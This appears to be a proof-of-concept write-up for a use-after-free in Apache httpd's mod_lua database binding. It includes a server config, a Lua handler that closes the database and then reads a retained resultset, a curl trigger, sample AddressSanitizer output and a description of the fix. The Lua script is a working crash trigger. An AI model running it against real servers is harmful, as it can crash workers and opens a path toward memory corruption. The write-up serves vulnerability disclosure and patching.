# PoC 089 - mod_lua DBD Resultset Use After Pool Destroy

Lua resultsets stored `db->pool` directly; `db:close()` destroys that pool,
leaving any retained resultset referencing freed APR storage. Calling the
resultset afterwards reaches `apr_dbd_get_row()` with a dangling pool.

## Setup

`/etc/apache2/httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule lua_module modules/mod_lua.so
LoadModule dbd_module modules/mod_dbd.so

# Direct APR_DBD handle (the patch description targets this lifetime).
DBDriver sqlite3
DBDParams "/tmp/uaf.db"

ErrorLog logs/error_log
LogLevel debug

<Location "/uaf">
    SetHandler lua-script
</Location>
LuaMapHandler "/uaf" "/etc/apache2/lua/uaf.lua" handle
```

Build httpd with AddressSanitizer:

```bash
CFLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer" \
LDFLAGS="-fsanitize=address" \
./configure --enable-lua --enable-dbd
make
```

Seed the SQLite database:

```bash
sqlite3 /tmp/uaf.db <<SQL
CREATE TABLE t(id INTEGER, name TEXT);
INSERT INTO t VALUES (1,'alice'),(2,'bob');
SQL
```

`/etc/apache2/lua/uaf.lua`:

```lua
function handle(r)
    -- Direct APR_DBD handle (not the mod_dbd-pooled handle).
    local db = r:dbacquire("sqlite3", "/tmp/uaf.db")
    local rs = assert(db:select("SELECT id, name FROM t"))

    -- Drain one row to confirm rs works.
    local row = rs(0)
    r:puts("first row id=" .. row[1] .. "\n")

    -- Trigger: close the database; in 2.4.66 this destroys db->pool, which
    -- backed rs->pool and rs->results.
    db:close()

    -- Use the resultset after pool destruction.
    local row2 = rs(1)              -- reaches lua_db_get_row()
    r:puts("after-close id=" .. tostring(row2 and row2[1]) .. "\n")
end
```

## Trigger

```bash
./httpd -X -f /etc/apache2/httpd.conf &
curl -i http://127.0.0.1:8080/uaf
```

## Observed effect

AddressSanitizer reports the use-after-free as soon as `lua_db_get_row()`
dereferences `res->pool` / `res->results`:

```text
==NN==ERROR: AddressSanitizer: heap-use-after-free on address 0x... 
  READ of size 8 at 0x... thread T0
    #0 apr_dbd_get_row ...
    #1 lua_db_get_row modules/lua/lua_dbd.c:248
    #2 lua_pcall ...
    #3 lua_request_rec_handler ...
  freed by thread T0 here:
    #0 free
    #1 apr_pool_destroy
    #2 lua_db_close modules/lua/lua_dbd.c:... (db->pool)
  previously allocated by thread T0 here:
    #0 malloc
    #1 apr_dbd_select   (allocated from db->pool)
SUMMARY: AddressSanitizer: heap-use-after-free
```

Without ASan, behaviour is undefined: either garbage row data is returned, or
the worker crashes once the underlying allocator reuses the memory.

## Log marker

`error_log`:

```text
[core:notice] AH00052: child pid <pid> exit signal Segmentation fault (11)
```

ASan output is written to stderr (or the configured `ErrorLog "|cat"`).

## Notes

- The resultset must be a direct APR_DBD handle; mod_dbd's connection-pool
  handles share a longer-lived pool and do not exhibit the same destruction.
- Patched builds give each resultset its own `apr_pool_t` and free it via a
  Lua `__gc` handler, so `db:close()` no longer poisons retained resultsets.
- The trigger pattern (acquire, select, close, iterate) is plausible in real
  Lua handlers that cache resultsets between requests through upvalues or
  module-level tables.
